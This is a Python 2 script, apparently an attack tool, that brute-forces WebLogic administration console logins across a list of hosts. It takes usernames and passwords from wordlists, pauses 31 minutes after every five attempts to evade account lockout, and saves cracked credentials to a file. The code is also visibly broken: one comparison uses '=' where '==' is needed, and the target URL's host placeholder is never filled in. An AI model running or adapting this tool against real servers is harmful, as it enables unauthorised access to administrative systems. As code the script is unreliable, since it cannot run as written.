#coding=utf-8
import Queue
import requests
import time
import threading
import sys
import os

def post(i):
	global xtime
	global success
	global fail
	global error
	pwdcount=len(open('pwd.txt','rU').readlines())
	usrcount=len(open('usr.txt','rU').readlines())
	sum=pwdcount*usrcount
	co=0
	for usr in open("usr.txt").readlines():
		usr=usr.strip('\n')
		z=0
		for pwd in open("pwd.txt").readlines():
			pwd=pwd.strip('\n')
			z+=1
			co+=1
			if z == 6:
				print i+' Waiting......'
				ct=0
				b=31
				while (ct<b):
					ncount=b-ct
					ncount='%d' %ncount
					print i+'\n'+ncount+'min left'
					time.sleep(60)
					ct+=1
				z=1
			data = {'j_username':usr,'j_password':pwd}
			count=0
			while True:
				count+=1
				try:
					s = requests.post('http://%s/console/j_security_check',data =data,timeout=5)
					if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
						print 'Success!!!!! %s\t%s/%s                                             '%(i,usr,pwd) 
						success+=1
						print usr+'/'+pwd
						f=open(xtime+'.txt', 'a')
						f.write('%s %s/%s'%(i,usr,pwd))
						f.close()
						s=0
						return
					elif co == sum:
						print i,'Failed!                                                         '
						fail+=1
						f = open(xtime+'bad.txt', 'a')
						f.write(i+'\n')
						f.close()
						s = 0
						return
				except:
					if count=3:
						print i,'Error!                                                          '
						error+=1
						f = open(xtime+'error.txt', 'a')
						f.write(i+'\n')
						f.close()
						s = 0
						return

def main():
	global xtime
	global success
	global fail
	global error
	error=0
	success=0
	fail=0
	xtime=time.strftime("%Y-%m-%d[%H.%M.%S]")
	print xtime
	MaxThreads=sys.argv[1]
	MaxThreads=int(MaxThreads)
	mythreads = Queue.Queue(maxsize = 0) 
	for i in open("u.txt").readlines():
		i=i.strip('\n')
		t=threading.Thread(target=post, args=(i,))
		t.setDaemon(True)
		mythreads.put(t)
	print 'Total Threads:%d' %MaxThreads
	print 'Total URLs:%d' %mythreads.qsize()
	time.sleep(2)
	while True:
		if(threading.active_count() == 1 and mythreads.qsize() == 0):
			print 'Done at %s' %time.strftime("%Y-%m-%d[%H.%M.%S]")
			break
		elif(threading.active_count() < MaxThreads):
			if (mythreads.qsize() ==0 ):
				print "title No URL left,waiting to exit,Current threads: %d,Success:%d,Failed:%d,Error:%d\r" %(threading.active_count(),success,fail,error),
				time.sleep(60)
			else:
				print "title Current threads: %d,URLs left: %d,Success:%d,Failed:%d,Error:%d\r" %(threading.active_count(),mythreads.qsize(),success,fail,error),
				t=mythreads.get()
				t.start()
				t.join(1)
	print 'Success:%d,Failed:%d,Error:%d' %(success,fail,error)

if __name__ == '__main__':
	main()
